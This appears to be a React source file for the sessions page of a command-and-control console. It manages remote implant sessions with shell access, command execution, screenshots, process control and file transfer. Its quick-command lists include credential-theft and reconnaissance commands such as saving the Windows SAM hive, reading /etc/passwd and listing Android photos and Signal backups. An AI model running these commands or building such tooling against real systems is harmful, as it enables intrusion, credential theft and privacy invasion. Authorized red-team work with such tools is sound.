import { useState, useRef } from 'react'
import { useAPI, apiDelete, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import {
  Monitor, Skull, Terminal, RefreshCw, Send, Copy, CheckCheck,
  List, Camera, FolderOpen, ChevronDown, ChevronUp,
  X, Download, Upload, Loader, Search,
} from 'lucide-react'

interface Props {
  onOpenTerminal: (sessionID: string, sessionName: string) => void
}

// ─── Process types ────────────────────────────────────────────────────────────
interface Process {
  pid: number; ppid: number; executable: string
  owner: string; arch: string; cmdline: string[]
}

// ─── File browser types ───────────────────────────────────────────────────────
interface FileInfo {
  name: string; is_dir: boolean; size: number; mod_time: number; mode: string
}
interface LsResp { path: string; files: FileInfo[] }

// ─── Screenshot type ─────────────────────────────────────────────────────────
interface ScreenshotResp { data: string }

// ─── Execute result ───────────────────────────────────────────────────────────
interface ExecResult { stdout: string; stderr: string; exit_code: number }

// ─── Quick commands ───────────────────────────────────────────────────────────
const QUICK_WIN  = [
  { label: 'whoami /all',  cmd: 'cmd.exe /c whoami /all' },
  { label: 'hostname',     cmd: 'cmd.exe /c hostname' },
  { label: 'ipconfig',     cmd: 'cmd.exe /c ipconfig /all' },
  { label: 'tasklist',     cmd: 'cmd.exe /c tasklist' },
  { label: 'netstat',      cmd: 'cmd.exe /c netstat -ano' },
  { label: 'systeminfo',   cmd: 'cmd.exe /c systeminfo' },
  { label: 'net user',     cmd: 'cmd.exe /c net user' },
  { label: 'net groups',   cmd: 'cmd.exe /c net localgroup administrators' },
  { label: 'reg SAM',      cmd: 'cmd.exe /c reg save hklm\\sam C:\\sam.bak' },
  { label: 'env vars',     cmd: 'cmd.exe /c set' },
]
const QUICK_UNIX = [
  { label: 'id',          cmd: 'id' },
  { label: 'hostname',    cmd: 'hostname' },
  { label: 'ip addr',     cmd: 'ip addr show' },
  { label: 'ps aux',      cmd: 'ps aux' },
  { label: 'ss -tulpn',   cmd: 'ss -tulpn' },
  { label: 'uname -a',    cmd: 'uname -a' },
  { label: '/etc/passwd', cmd: 'cat /etc/passwd' },
  { label: 'sudo -l',     cmd: 'sudo -l' },
  { label: 'crontab -l',  cmd: 'crontab -l' },
  { label: 'env',         cmd: 'env' },
]
const QUICK_ANDROID = [
  { label: 'id',            cmd: 'id' },
  { label: 'uname -a',      cmd: 'uname -a' },
  { label: 'env',           cmd: 'env' },
  { label: 'ls /sdcard',    cmd: 'ls /sdcard' },
  { label: 'ls Downloads',  cmd: 'ls /sdcard/Download' },
  { label: 'ls DCIM',       cmd: 'ls /sdcard/DCIM' },
  { label: 'cat contacts',  cmd: 'ls /sdcard/Signal\\ BackUp/ 2>/dev/null || echo no-signal' },
  { label: 'net info',      cmd: 'cat /proc/net/if_inet6 2>/dev/null; ip route 2>/dev/null || true' },
  { label: 'cpu info',      cmd: 'cat /proc/cpuinfo | grep Hardware | head -3' },
  { label: 'storage',       cmd: 'df -h /sdcard /data 2>/dev/null' },
]

function fmtBytes(b: number) {
  return b >= 1 << 20 ? `${(b / (1 << 20)).toFixed(1)}M` : b >= 1024 ? `${(b / 1024).toFixed(1)}K` : `${b}B`
}

export default function Sessions({ onOpenTerminal }: Props) {
  const { data, loading, error, refresh } = useAPI<Session[]>('/api/sessions', 5_000)
  const sessions = data ?? []

  const [killing,    setKilling]    = useState<string | null>(null)
  const [expanded,   setExpanded]   = useState<string | null>(null)
  const [customCmd,  setCustomCmd]  = useState<Record<string, string>>({})
  const [executing,  setExecuting]  = useState<string | null>(null)
  const [execResults,setExecResults]= useState<Record<string, ExecResult[]>>({})
  const [copied,     setCopied]     = useState<string | null>(null)
  const [psModal,    setPsModal]    = useState<{ session: Session; procs: Process[] } | null>(null)
  const [psLoading,  setPsLoading]  = useState<string | null>(null)
  const [psFilter,   setPsFilter]   = useState('')
  const [psSort,     setPsSort]     = useState<'pid'|'exe'|'owner'>('pid')
  const [shotModal,  setShotModal]  = useState<{ session: Session; data: string } | null>(null)
  const [shotLoading,setShotLoading]= useState<string | null>(null)
  const [fsModal,    setFsModal]    = useState<{ session: Session; ls: LsResp } | null>(null)
  const [fsLoading,  setFsLoading]  = useState<string | null>(null)
  const [fsPath,     setFsPath]     = useState<Record<string, string>>({})
  const [termProc,   setTermProc]   = useState<{ pid: number; session: Session } | null>(null)
  const [uploading,  setUploading]  = useState(false)
  const [uploadMsg,  setUploadMsg]  = useState<string | null>(null)
  const uploadRef = useRef<HTMLInputElement>(null)

  async function killSession(id: string) {
    if (!confirm('Kill this session?')) return
    setKilling(id); try { await apiDelete(`/api/sessions/${id}/kill`); refresh() } catch {} finally { setKilling(null) }
  }

  async function execute(s: Session, cmd: string) {
    setExecuting(s.id)
    try {
      const res = await apiPost<ExecResult>(`/api/sessions/${s.id}/execute`, { command: cmd })
      setExecResults(prev => ({ ...prev, [s.id]: [res, ...(prev[s.id] ?? [])].slice(0, 10) }))
    } catch (e) {
      setExecResults(prev => ({ ...prev, [s.id]: [{ stdout: '', stderr: String(e), exit_code: -1 }, ...(prev[s.id] ?? [])].slice(0, 10) }))
    } finally { setExecuting(null) }
  }

  async function openPS(s: Session) {
    setPsLoading(s.id)
    try {
      const procs = await apiFetch<Process[]>(`/api/sessions/${s.id}/ps`)
      setPsModal({ session: s, procs })
    } catch (e) { alert(String(e)) }
    finally { setPsLoading(null) }
  }

  async function openScreenshot(s: Session) {
    setShotLoading(s.id)
    try {
      const res = await apiFetch<ScreenshotResp>(`/api/sessions/${s.id}/screenshot`)
      setShotModal({ session: s, data: res.data })
    } catch (e) { alert(String(e)) }
    finally { setShotLoading(null) }
  }

  async function openFS(s: Session, path?: string) {
    const p = path ?? fsPath[s.id] ?? (s.os?.toLowerCase().includes('windows') ? 'C:\\' : '/')
    setFsLoading(s.id)
    try {
      const ls = await apiFetch<LsResp>(`/api/sessions/${s.id}/ls?path=${encodeURIComponent(p)}`)
      setFsPath(prev => ({ ...prev, [s.id]: ls.path }))
      setFsModal({ session: s, ls })
    } catch (e) { alert(String(e)) }
    finally { setFsLoading(null) }
  }

  async function downloadFile(s: Session, path: string) {
    window.open(`/api/sessions/${s.id}/download?path=${encodeURIComponent(path)}`, '_blank')
  }

  async function uploadFile(s: Session, file: File, remotePath: string) {
    setUploading(true); setUploadMsg(null)
    try {
      const form = new FormData()
      form.append('file', file)
      form.append('path', remotePath + '/' + file.name)
      const res = await fetch(`/api/sessions/${s.id}/upload`, { method: 'POST', body: form })
      if (!res.ok) throw new Error(await res.text())
      const json = await res.json() as { path: string; written_files: number }
      setUploadMsg(`✓ Uploaded to ${json.path}`)
      openFS(s, remotePath)
    } catch (e) {
      setUploadMsg(`✗ ${String(e)}`)
    } finally { setUploading(false) }
  }

  async function killProcess(s: Session, pid: number) {
    if (!confirm(`Kill PID ${pid}?`)) return
    setTermProc({ pid, session: s })
    try { await apiDelete(`/api/sessions/${s.id}/ps/${pid}`) }
    catch (e) { alert(String(e)) }
    finally {
      setTermProc(null)
      if (psModal?.session.id === s.id) {
        const procs = await apiFetch<Process[]>(`/api/sessions/${s.id}/ps`).catch(() => psModal.procs)
        setPsModal({ session: s, procs })
      }
    }
  }

  function copyText(text: string, key: string) {
    navigator.clipboard.writeText(text).then(() => { setCopied(key); setTimeout(() => setCopied(null), 1500) })
  }

  // ── PS modal filtered + sorted ─────────────────────────────────────────
  const filteredProcs = (psModal?.procs ?? [])
    .filter(p => !psFilter || p.executable.toLowerCase().includes(psFilter.toLowerCase()) || p.owner.toLowerCase().includes(psFilter.toLowerCase()))
    .sort((a, b) => {
      if (psSort === 'pid')   return a.pid - b.pid
      if (psSort === 'exe')   return a.executable.localeCompare(b.executable)
      if (psSort === 'owner') return a.owner.localeCompare(b.owner)
      return 0
    })

  return (
    <div className="flex flex-col gap-4 h-full">

      {/* ── Toolbar ──────────────────────────────────────────────────── */}
      <div className="flex items-center justify-between">
        <h2 className="text-primary font-bold text-lg flex items-center gap-2">
          <Monitor size={18} /> Sessions <span className="text-muted text-sm font-normal">({sessions.length})</span>
        </h2>
        <button onClick={refresh} className="flex items-center gap-1 text-muted hover:text-text text-xs px-2 py-1 rounded border border-border">
          <RefreshCw size={12} /> Refresh
        </button>
      </div>

      {error && <div className="text-danger text-xs bg-danger/10 border border-danger/30 rounded p-2">{error}</div>}

      {loading && sessions.length === 0 ? <div className="text-muted text-sm">Loading…</div>
      : sessions.length === 0 ? (
        <div className="flex-1 flex flex-col items-center justify-center gap-3 text-center py-12">
          <Monitor size={40} className="text-border" />
          <p className="text-muted text-sm">No active sessions.</p>
        </div>
      ) : (
        <div className="flex flex-col gap-2">
          {sessions.map(s => {
            const osLow  = s.os?.toLowerCase() ?? ''
            const isWin     = osLow.includes('windows')
            const isAndroid = osLow.includes('android')
            const quick  = isWin ? QUICK_WIN : isAndroid ? QUICK_ANDROID : QUICK_UNIX
            const isExp = expanded === s.id
            const myRes = execResults[s.id] ?? []
            const isExec = executing === s.id

            return (
              <div key={s.id} className={`rounded-lg border bg-surface ${s.is_dead ? 'border-danger/30 opacity-60' : 'border-border'}`}>

                {/* ── Header ─────────────────────────────────────── */}
                <div className="flex items-center gap-3 px-4 py-3">
                  <span className={`w-2 h-2 rounded-full shrink-0 ${s.is_dead ? 'bg-danger' : 'bg-primary animate-pulse'}`} />
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-primary font-bold text-sm">{s.name}</span>
                      <span className="text-muted text-[10px] font-mono">{s.id.slice(0,8)}</span>
                      <span className="text-muted text-[10px] bg-border/40 px-1.5 py-0.5 rounded">{s.os}/{s.arch}</span>
                      <span className="text-muted text-[10px] bg-border/40 px-1.5 py-0.5 rounded">{s.transport}</span>
                    </div>
                    <div className="text-muted text-[10px] mt-0.5 truncate">
                      {s.username}@{s.hostname} · {s.remote_address} · PID {s.pid}
                    </div>
                  </div>

                  {/* Action buttons */}
                  <div className="flex items-center gap-1 shrink-0 flex-wrap justify-end">
                    {/* Interactive shell */}
                    <button onClick={() => onOpenTerminal(s.id, s.name)}
                      className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-primary bg-primary/10 border border-primary/30 hover:bg-primary/20 transition-colors">
                      <Terminal size={11} /> Shell
                    </button>
                    {/* PS — not supported on Android */}
                    {!isAndroid && (
                      <button onClick={() => openPS(s)} disabled={psLoading === s.id}
                        className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-accent bg-accent/10 border border-accent/30 hover:bg-accent/20 transition-colors disabled:opacity-40">
                        {psLoading === s.id ? <Loader size={11} className="animate-spin" /> : <List size={11} />} PS
                      </button>
                    )}
                    {/* Screenshot — not supported on Android */}
                    {!isAndroid && (
                      <button onClick={() => openScreenshot(s)} disabled={shotLoading === s.id}
                        className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-purple bg-purple/10 border border-purple/30 hover:bg-purple/20 transition-colors disabled:opacity-40"
                        title="Screenshot">
                        {shotLoading === s.id ? <Loader size={11} className="animate-spin" /> : <Camera size={11} />}
                      </button>
                    )}
                    {/* Files */}
                    <button onClick={() => openFS(s)} disabled={fsLoading === s.id}
                      className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-warn bg-warn/10 border border-warn/30 hover:bg-warn/20 transition-colors disabled:opacity-40"
                      title="File Browser">
                      {fsLoading === s.id ? <Loader size={11} className="animate-spin" /> : <FolderOpen size={11} />}
                    </button>
                    {/* Execute expand */}
                    <button onClick={() => setExpanded(isExp ? null : s.id)}
                      className="flex items-center gap-1 px-2 py-1.5 rounded text-[11px] text-warn bg-warn/10 border border-warn/30 hover:bg-warn/20 transition-colors">
                      <Send size={11} /> Run
                      {isExp ? <ChevronUp size={9}/> : <ChevronDown size={9}/>}
                    </button>
                    {/* Kill */}
                    <button onClick={() => killSession(s.id)} disabled={!!killing}
                      className="p-1.5 rounded text-danger hover:bg-danger/10 border border-transparent hover:border-danger/30 disabled:opacity-40">
                      <Skull size={13} />
                    </button>
                  </div>
                </div>

                {/* ── Execute panel ───────────────────────────────── */}
                {isExp && (
                  <div className="border-t border-border/60 px-4 py-3 flex flex-col gap-3">
                    {/* Quick commands */}
                    <div>
                      <label className="text-[10px] text-muted uppercase tracking-widest mb-2 block">Quick Commands</label>
                      <div className="flex flex-wrap gap-1.5">
                        {quick.map(q => (
                          <button key={q.label} onClick={() => execute(s, q.cmd)} disabled={isExec}
                            className="px-2.5 py-1 rounded text-[10px] border border-border text-muted hover:border-warn hover:text-warn transition-colors disabled:opacity-40 font-mono">
                            {q.label}
                          </button>
                        ))}
                      </div>
                    </div>
                    {/* Custom input */}
                    <div className="flex gap-2">
                      <input value={customCmd[s.id] ?? ''} disabled={isExec}
                        onChange={e => setCustomCmd(p => ({ ...p, [s.id]: e.target.value }))}
                        onKeyDown={e => { if (e.key === 'Enter' && customCmd[s.id]?.trim()) { execute(s, customCmd[s.id]); setCustomCmd(p => ({ ...p, [s.id]: '' })) } }}
                        placeholder={isWin ? 'cmd.exe /c <cmd>' : isAndroid ? 'ls /sdcard  or  id  or  uname -a' : '/bin/bash -c <cmd>'}
                        className="flex-1 bg-bg border border-border rounded px-3 py-2 text-xs font-mono text-text placeholder-muted focus:border-warn outline-none" />
                      <button onClick={() => { if (customCmd[s.id]?.trim()) { execute(s, customCmd[s.id]); setCustomCmd(p => ({ ...p, [s.id]: '' })) } }}
                        disabled={isExec || !customCmd[s.id]?.trim()}
                        className="px-3 py-2 rounded bg-warn/10 border border-warn/30 text-warn hover:bg-warn/20 disabled:opacity-40">
                        {isExec ? <Loader size={13} className="animate-spin"/> : <Send size={13}/>}
                      </button>
                    </div>
                    {/* Results */}
                    {myRes.map((r, i) => (
                      <div key={i} className="rounded border border-border/60 bg-bg">
                        <div className="flex items-center justify-between px-3 py-1.5 border-b border-border/40">
                          <span className={`text-[10px] px-1.5 rounded ${r.exit_code === 0 ? 'text-primary bg-primary/10' : 'text-danger bg-danger/10'}`}>exit {r.exit_code}</span>
                          <button onClick={() => copyText(r.stdout || r.stderr, `${s.id}-${i}`)} className="text-muted hover:text-primary">
                            {copied === `${s.id}-${i}` ? <CheckCheck size={10} className="text-primary"/> : <Copy size={10}/>}
                          </button>
                        </div>
                        <pre className="px-3 py-2 text-[11px] font-mono text-text overflow-x-auto max-h-48 whitespace-pre-wrap break-all">
                          {r.stdout || r.stderr || '(no output)'}
                        </pre>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )
          })}
        </div>
      )}

      {/* ─────────────── PS MODAL ─────────────────────────────────── */}
      {psModal && (
        <div className="fixed inset-0 bg-bg/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-surface border border-border rounded-xl shadow-2xl w-full max-w-4xl max-h-[80vh] flex flex-col">
            {/* Header */}
            <div className="flex items-center justify-between px-4 py-3 border-b border-border">
              <h3 className="text-accent font-semibold flex items-center gap-2">
                <List size={14}/> Process List — {psModal.session.name}
                <span className="text-muted text-xs font-normal">({filteredProcs.length} processes)</span>
              </h3>
              <div className="flex items-center gap-2">
                {/* Sort */}
                <select value={psSort} onChange={e => setPsSort(e.target.value as typeof psSort)}
                  className="bg-bg border border-border rounded px-2 py-1 text-[10px] text-muted focus:border-accent outline-none">
                  <option value="pid">Sort: PID</option>
                  <option value="exe">Sort: Name</option>
                  <option value="owner">Sort: Owner</option>
                </select>
                {/* Filter */}
                <div className="relative">
                  <Search size={10} className="absolute left-2 top-1.5 text-muted pointer-events-none"/>
                  <input value={psFilter} onChange={e => setPsFilter(e.target.value)}
                    placeholder="Filter…"
                    className="bg-bg border border-border rounded pl-6 pr-2 py-1 text-[10px] text-text focus:border-accent outline-none w-28"/>
                </div>
                <button onClick={() => openPS(psModal.session)} className="text-muted hover:text-accent"><RefreshCw size={13}/></button>
                <button onClick={() => { setPsModal(null); setPsFilter('') }} className="text-muted hover:text-danger"><X size={14}/></button>
              </div>
            </div>
            {/* Table */}
            <div className="overflow-auto flex-1">
              <table className="w-full text-[11px] font-mono border-collapse">
                <thead className="sticky top-0 bg-surface">
                  <tr className="text-muted text-[9px] uppercase tracking-widest border-b border-border">
                    <th className="text-left px-3 py-2">PID</th>
                    <th className="text-left px-3 py-2">PPID</th>
                    <th className="text-left px-3 py-2">Name</th>
                    <th className="text-left px-3 py-2">Owner</th>
                    <th className="text-left px-3 py-2">Arch</th>
                    <th className="text-left px-3 py-2">Cmdline</th>
                    <th className="text-left px-3 py-2">Action</th>
                  </tr>
                </thead>
                <tbody>
                  {filteredProcs.map(p => (
                    <tr key={p.pid} className="border-b border-border/30 hover:bg-bg/60">
                      <td className="px-3 py-1.5 text-accent">{p.pid}</td>
                      <td className="px-3 py-1.5 text-muted">{p.ppid}</td>
                      <td className="px-3 py-1.5 text-text">{p.executable}</td>
                      <td className="px-3 py-1.5 text-muted">{p.owner}</td>
                      <td className="px-3 py-1.5 text-muted">{p.arch}</td>
                      <td className="px-3 py-1.5 text-muted max-w-[200px] truncate">{(p.cmdline ?? []).join(' ')}</td>
                      <td className="px-3 py-1.5">
                        <button onClick={() => killProcess(psModal.session, p.pid)}
                          disabled={termProc?.pid === p.pid}
                          className="text-danger hover:bg-danger/10 px-1.5 py-0.5 rounded text-[9px] border border-danger/30 disabled:opacity-40">
                          {termProc?.pid === p.pid ? '…' : 'Kill'}
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}

      {/* ─────────────── SCREENSHOT MODAL ─────────────────────────── */}
      {shotModal && (
        <div className="fixed inset-0 bg-bg/90 backdrop-blur-sm z-50 flex items-center justify-center p-4"
          onClick={() => setShotModal(null)}>
          <div className="bg-surface border border-border rounded-xl shadow-2xl max-w-4xl w-full flex flex-col gap-3 p-4"
            onClick={e => e.stopPropagation()}>
            <div className="flex items-center justify-between">
              <h3 className="text-purple font-semibold flex items-center gap-2">
                <Camera size={14}/> Screenshot — {shotModal.session.name}
              </h3>
              <div className="flex gap-2">
                <a href={`data:image/png;base64,${shotModal.data}`} download={`screenshot-${shotModal.session.name}.png`}
                  className="flex items-center gap-1 text-xs text-muted hover:text-primary px-2 py-1 rounded border border-border">
                  <Download size={12}/> Save
                </a>
                <button onClick={() => setShotModal(null)} className="text-muted hover:text-danger"><X size={14}/></button>
              </div>
            </div>
            {shotModal.data
              ? <img src={`data:image/png;base64,${shotModal.data}`} alt="screenshot" className="rounded border border-border max-h-[60vh] object-contain w-full" />
              : <div className="text-muted text-xs py-8 text-center">No image data returned — session may not support screenshots.</div>}
          </div>
        </div>
      )}

      {/* ─────────────── FILE BROWSER MODAL ───────────────────────── */}
      {fsModal && (
        <div className="fixed inset-0 bg-bg/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-surface border border-border rounded-xl shadow-2xl w-full max-w-3xl max-h-[80vh] flex flex-col">
            <div className="flex items-center justify-between px-4 py-3 border-b border-border">
              <h3 className="text-warn font-semibold flex items-center gap-2">
                <FolderOpen size={14}/> Files — {fsModal.session.name}
              </h3>
              <div className="flex items-center gap-2">
                <button onClick={() => openFS(fsModal.session)} className="text-muted hover:text-warn"><RefreshCw size={13}/></button>
                <button onClick={() => setFsModal(null)} className="text-muted hover:text-danger"><X size={14}/></button>
              </div>
            </div>

            {/* Path bar */}
            <div className="px-4 py-2 border-b border-border/40 flex items-center gap-2">
              <span className="text-muted text-[10px]">Path:</span>
              <div className="flex-1 flex items-center gap-1 flex-wrap">
                {fsModal.ls.path.split(/[/\\]/).filter(Boolean).reduce<string[]>((acc, part) => {
                  acc.push((acc[acc.length - 1] ?? '') + '/' + part)
                  return acc
                }, []).map((p, i, arr) => (
                  <span key={p} className="flex items-center gap-1">
                    <button onClick={() => openFS(fsModal.session, p)}
                      className="text-[10px] text-warn hover:text-primary font-mono">
                      {p.split('/').pop() || '/'}
                    </button>
                    {i < arr.length - 1 && <span className="text-muted text-[10px]">/</span>}
                  </span>
                ))}
              </div>
            </div>

            {/* Upload bar */}
            <div className="px-4 py-2 border-b border-border/40 flex items-center gap-2">
              <input ref={uploadRef} type="file" className="hidden"
                onChange={e => {
                  const file = e.target.files?.[0]
                  if (file) uploadFile(fsModal.session, file, fsModal.ls.path)
                  if (uploadRef.current) uploadRef.current.value = ''
                }} />
              <button onClick={() => uploadRef.current?.click()} disabled={uploading}
                className="flex items-center gap-1.5 px-3 py-1 rounded text-[10px] border border-warn/30 text-warn hover:bg-warn/10 transition-colors disabled:opacity-40">
                {uploading ? <Loader size={10} className="animate-spin"/> : <Upload size={10}/>}
                {uploading ? 'Uploading…' : 'Upload File'}
              </button>
              {uploadMsg && (
                <span className={`text-[10px] ${uploadMsg.startsWith('✓') ? 'text-primary' : 'text-danger'}`}>
                  {uploadMsg}
                </span>
              )}
            </div>

            {/* File list */}
            <div className="overflow-auto flex-1">
              <table className="w-full text-[11px] font-mono border-collapse">
                <thead className="sticky top-0 bg-surface">
                  <tr className="text-muted text-[9px] uppercase tracking-widest border-b border-border">
                    <th className="text-left px-3 py-2">Name</th>
                    <th className="text-left px-3 py-2">Size</th>
                    <th className="text-left px-3 py-2">Mode</th>
                    <th className="text-left px-3 py-2">Modified</th>
                    <th className="px-3 py-2"></th>
                  </tr>
                </thead>
                <tbody>
                  {(fsModal.ls.files ?? []).map(f => {
                    const fullPath = fsModal.ls.path.replace(/\/$/, '') + '/' + f.name
                    return (
                      <tr key={f.name} className="border-b border-border/30 hover:bg-bg/60">
                        <td className="px-3 py-1.5">
                          {f.is_dir ? (
                            <button onClick={() => openFS(fsModal.session, fullPath)}
                              className="text-warn hover:text-primary flex items-center gap-1">
                              📁 {f.name}
                            </button>
                          ) : (
                            <span className="text-text flex items-center gap-1">📄 {f.name}</span>
                          )}
                        </td>
                        <td className="px-3 py-1.5 text-muted">{f.is_dir ? '—' : fmtBytes(f.size)}</td>
                        <td className="px-3 py-1.5 text-muted text-[9px]">{f.mode}</td>
                        <td className="px-3 py-1.5 text-muted text-[9px]">
                          {f.mod_time ? new Date(f.mod_time * 1000).toLocaleDateString() : '—'}
                        </td>
                        <td className="px-3 py-1.5">
                          {!f.is_dir && (
                            <button onClick={() => downloadFile(fsModal.session, fullPath)}
                              className="text-muted hover:text-primary" title="Download">
                              <Download size={11}/>
                            </button>
                          )}
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
